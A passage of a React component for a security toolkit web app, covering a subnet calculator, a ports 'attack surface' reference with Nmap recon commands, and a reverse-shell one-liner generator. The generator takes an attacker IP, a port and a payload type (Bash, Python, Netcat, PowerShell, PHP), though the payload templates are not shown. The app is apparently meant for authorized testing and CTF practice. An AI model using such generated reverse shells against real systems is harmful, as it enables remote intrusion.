                  onClick={() => copyToClipboard(uuid, `uuid-${idx}`)}
                  className="flex items-center gap-1 text-xs font-mono text-slate-400 hover:text-white px-3 py-1.5 rounded-lg bg-slate-800 transition-colors shrink-0"
                >
                  {copiedId === `uuid-${idx}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                  <span>{copiedId === `uuid-${idx}` ? 'Copied' : 'Copy'}</span>
                </button>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* 9. Subnet CIDR Calculator */}
      {activeTab === 'subnet-calc' && (
        <div className="bg-[#090d16] border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-slate-800 pb-4">
            <h3 className="text-lg font-bold text-white font-mono flex items-center gap-2">
              <Network className="w-5 h-5 text-indigo-400" />
              IPv4 Subnet &amp; CIDR Mask Calculator
            </h3>
            <p className="text-xs text-slate-400 font-sans">Calculate network boundaries and usable host ranges.</p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            <div className="space-y-2">
              <label className="text-xs font-mono text-slate-300">Base IP Address:</label>
              <input
                type="text"
                value={cidrIp}
                onChange={(e) => setCidrIp(e.target.value)}
                className="w-full px-4 py-2.5 bg-[#050811] border border-slate-700 rounded-xl text-sm font-mono text-indigo-300 focus:outline-none focus:border-indigo-500"
              />
            </div>
            <div className="space-y-2">
              <div className="flex justify-between text-xs font-mono text-slate-300">
                <span>CIDR Prefix: /{cidrMask}</span>
                <span className="text-indigo-400">{subnetCalc.netmask}</span>
              </div>
              <input
                type="range"
                min="8"
                max="30"
                value={cidrMask}
                onChange={(e) => setCidrMask(Number(e.target.value))}
                className="w-full accent-indigo-500 cursor-pointer h-2 bg-slate-800 rounded-lg mt-3"
              />
            </div>
          </div>

          <div className="grid grid-cols-2 sm:grid-cols-4 gap-4 font-mono text-xs">
            <div className="bg-[#050811] p-3.5 rounded-xl border border-slate-800">
              <span className="text-slate-500 block">Total Hosts:</span>
              <span className="text-base font-bold text-white">{subnetCalc.totalHosts}</span>
            </div>
            <div className="bg-[#050811] p-3.5 rounded-xl border border-slate-800">
              <span className="text-slate-500 block">Usable Hosts:</span>
              <span className="text-base font-bold text-emerald-400">{subnetCalc.usableHosts}</span>
            </div>
            <div className="bg-[#050811] p-3.5 rounded-xl border border-slate-800">
              <span className="text-slate-500 block">Wildcard Mask:</span>
              <span className="text-base font-bold text-amber-400">{subnetCalc.wildcard}</span>
            </div>
            <div className="bg-[#050811] p-3.5 rounded-xl border border-slate-800">
              <span className="text-slate-500 block">Classification:</span>
              <span className="text-sm font-bold text-cyan-400">{subnetCalc.classType}</span>
            </div>
          </div>
        </div>
      )}

      {/* 10. Common Ports Reference */}
      {activeTab === 'ports-reference' && (
        <div className="bg-[#090d16] border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-slate-800 pb-4 flex flex-wrap items-center justify-between gap-4">
            <div>
              <h3 className="text-lg font-bold text-white font-mono flex items-center gap-2">
                <Activity className="w-5 h-5 text-amber-400" />
                Common Ports &amp; Attack Surface Guide
              </h3>
              <p className="text-xs text-slate-400 font-sans">
                Search 50+ network ports, default credentials, and reconnaissance methodologies.
              </p>
            </div>
            <div className="relative w-full sm:w-64">
              <Search className="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                placeholder="Search port, service, protocol..."
                value={portSearch}
                onChange={(e) => setPortSearch(e.target.value)}
                className="w-full pl-9 pr-3 py-1.5 bg-[#050811] border border-slate-700 rounded-lg text-xs text-slate-200 focus:outline-none focus:border-amber-500 font-mono"
              />
            </div>
          </div>

          <div className="space-y-3 max-h-[500px] overflow-y-auto pr-1">
            {filteredPorts.map(p => (
              <div key={p.port} className="bg-[#050811] border border-slate-800 rounded-xl p-4 space-y-2 hover:border-slate-700 transition-colors font-mono">
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <div className="flex items-center gap-3">
                    <span className="px-2.5 py-1 rounded bg-amber-950 text-amber-400 border border-amber-800 font-bold text-sm">
                      Port {p.port}
                    </span>
                    <span className="text-xs font-bold text-white">{p.service}</span>
                    <span className="text-[10px] text-slate-500 px-1.5 py-0.5 rounded bg-slate-900 border border-slate-800">
                      {p.protocol}
                    </span>
                  </div>
                  <span className="text-xs text-slate-400 font-sans">{p.description}</span>
                </div>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs pt-1">
                  <div className="bg-[#090d16] p-2.5 rounded-lg border border-slate-800/80">
                    <span className="text-slate-500 block text-[10px] uppercase font-bold">Known Attack Vectors:</span>
                    <span className="text-red-400 font-sans text-xs">{p.vulnerabilities}</span>
                  </div>
                  <div className="bg-[#090d16] p-2.5 rounded-lg border border-slate-800/80">
                    <span className="text-slate-500 block text-[10px] uppercase font-bold">Nmap Recon Command:</span>
                    <code className="text-emerald-400 text-xs">{p.reconCommand}</code>
                  </div>
                </div>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* 11. Reverse Shell Generator */}
      {activeTab === 'revshell-tool' && (
        <div className="bg-[#090d16] border border-slate-800 rounded-2xl p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-slate-800 pb-4">
            <h3 className="text-lg font-bold text-white font-mono flex items-center gap-2">
              <Terminal className="w-5 h-5 text-red-400" />
              Reverse Shell One-Liner Generator
            </h3>
            <p className="text-xs text-slate-400 font-sans">For authorized penetration testing &amp; CTF lab exercises.</p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
            <div className="space-y-1">
              <label className="text-xs font-mono text-slate-300">Attacker IP (LHOST):</label>
              <input
                type="text"
                value={revIp}
                onChange={(e) => setRevIp(e.target.value)}
                className="w-full px-3.5 py-2 bg-[#050811] border border-slate-700 rounded-lg text-xs font-mono text-red-300 focus:outline-none focus:border-red-500"
              />
            </div>
            <div className="space-y-1">
              <label className="text-xs font-mono text-slate-300">Listening Port (LPORT):</label>
              <input
                type="text"
                value={revPort}
                onChange={(e) => setRevPort(e.target.value)}
                className="w-full px-3.5 py-2 bg-[#050811] border border-slate-700 rounded-lg text-xs font-mono text-red-300 focus:outline-none focus:border-red-500"
              />
            </div>
            <div className="space-y-1">
              <label className="text-xs font-mono text-slate-300">Payload Type:</label>
              <select
                value={revType}
                onChange={(e: any) => setRevType(e.target.value)}
                className="w-full px-3.5 py-2 bg-[#050811] border border-slate-700 rounded-lg text-xs font-mono text-white focus:outline-none focus:border-red-500"
              >
                <option value="bash">Bash (-i)</option>
                <option value="python">Python 3 PTY</option>
                <option value="netcat">Netcat Traditional</option>
                <option value="powershell">PowerShell TCP</option>
                <option value="php">PHP fsockopen</option>
              </select>
            </div>
          </div>

          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <span className="text-xs font-mono font-bold text-slate-300">Generated Command Payload:</span>
              <button
                onClick={() => copyToClipboard(generatedShell, 'rev-shell')}
                className="flex items-center gap-1.5 px-3 py-1 rounded bg-red-600 hover:bg-red-500 text-white text-xs font-mono font-bold transition-colors"
              >
                {copiedId === 'rev-shell' ? <Check className="w-3 h-3 text-white" /> : <Copy className="w-3 h-3" />}
                <span>{copiedId === 'rev-shell' ? 'Copied!' : 'Copy Payload'}</span>
              </button>
            </div>
            <pre className="p-4 bg-[#050811] border border-slate-800 rounded-xl text-xs font-mono text-red-300 overflow-x-auto select-all">
              {generatedShell}
            </pre>
          </div>
        </div>
      )}

      {/* 8. Interactive Packet Tracer & Handshake Inspector */}
      {activeTab === 'packet-tracer' && (
        <PacketTracerVisualizer />
      )}

      {/* 9. Linux Kernel Sysctl Hardening Switchboard */}
      {activeTab === 'sysctl-hardening' && (
        <SysctlHardeningTool />
      )}

      {/* 10. Content Security Policy (CSP) Builder & Auditor */}
      {activeTab === 'csp-builder' && (
        <CspBuilderTool />
      )}
    </div>
  );
};
